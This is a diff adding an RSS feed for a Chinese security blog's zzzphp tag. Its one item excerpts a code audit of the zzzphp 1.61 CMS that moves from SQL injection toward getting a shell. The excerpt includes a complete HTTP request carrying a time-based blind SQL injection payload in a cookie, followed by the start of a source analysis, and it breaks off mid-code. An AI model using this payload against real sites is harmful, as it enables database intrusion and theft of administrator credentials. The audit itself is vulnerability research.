@@ -1,0 +1,26 @@
+<?xml version="1.0" encoding="utf-8" standalone="yes"?>
+<rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom">
+  <channel>
+    <title>zzzphp on F0rmat&#39;Blog</title>
+    <link>https://getshe11.com/tags/zzzphp/</link>
+    <description>Recent content in zzzphp on F0rmat&#39;Blog</description>
+    <generator>Hugo -- gohugo.io</generator>
+    <language>en-us</language>
+    <lastBuildDate>Sun, 10 Mar 2019 17:56:36 +0000</lastBuildDate><atom:link href="https://getshe11.com/tags/zzzphp/index.xml" rel="self" type="application/rss+xml" />
+    <item>
+      <title>zzzphp1.61 代码审计-从SQL注入到Getshell</title>
+      <link>https://getshe11.com/posts/zzzphp1.61-code-auditing-from-injecting-to-taking-a-shell/</link>
+      <pubDate>Sun, 10 Mar 2019 17:56:36 +0000</pubDate>
+      
+      <guid>https://getshe11.com/posts/zzzphp1.61-code-auditing-from-injecting-to-taking-a-shell/</guid>
+      <description>0x01 前言 前天看到zzzphp这一个cms，看着有点像zzzcms，去看了也是zzzcms开发的一套程序，于是就去审计一下，这zzzcms我之前也有审计过 https://bbs.ichunqiu.com/thread-14684-1-1.html https://getpass.cn/zzcms-Any-user-password-changes-loopholes-code-points/ https://getpass.cn/ZZCMS8.2-any-file-deleted-to-getshell/ 这套程序漏洞确实比较多，后面也做了很多改善。 那天看了表哥写的一篇PHPCMS的代码审计文章，深有感悟，授人以鱼不如授人以渔，确实是，写那么多审计文章，从审计代码的开始到结束，这种文章少之甚少。我也希望我以后写的文章也带上这种方式。 这套审计的漏洞比较多，SQL注入漏洞、任意文件删除漏洞、任意文件读取漏洞、远程执行漏洞，当中也借助了漏扫工具。废话不多说，直接开始吧。 文章也是原来的方式，先复现后分析。
+0x02 SQL注入漏洞（ 获取管理员密码） 漏洞复现 payload:
+GET /search/ HTTP/1.1 Host: 127.0.0.1 User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.14; rv:60.0) Gecko/20100101 Firefox/60.0 Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8 Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2 Accept-Encoding: gzip, deflate Cookie: PHPSESSID=58ebb86ae371bd1f65466b1b94f7a5f7; zzz_adminpass=1;zzz_keys=0&#39;XOR(if(now()=sysdate(),sleep(10),0))XOR&#39;Z Connection: close Upgrade-Insecure-Requests: 1 Cache-Control: max-age=0 对比两次的时间就晓得我们的语句执行成功了，表示存在SQL注入漏洞。 漏洞分析 这个洞是先用AWVS工具扫了一遍出来的，我们审计一套代码的时候可以先试试这些漏扫工具，提高一下效率。虽然有误报但是收集到的信息比手工去检测的效率高。
+大家测试的时候可以用PHPstorm或者vscode这些工具去调试，走一遍整个过程，这样会对程序有所了解。
+再发一次包到search页面会停留到search/index.php文件，这个文件比较简单，包含了一个zzz_client.php的文件。
+&amp;lt;?php define(&amp;#39;LOCATION&amp;#39;, &amp;#39;search&amp;#39;); require dirname(dirname(__FILE__)). &amp;#39;/inc/zzz_client.php&amp;#39;; 进到inc/zzz_client.php文件有一些包含的进来的文件类似模板的文件等，这里通过上面的LOCATION找到$tplfile= TPL_DIR . &#39;search.html&#39;; 
+switch ($location) { case &amp;#39;about&amp;#39;: $tplfile= TPL_DIR .</description>
+    </item>
+    
+  </channel>
+</rss>
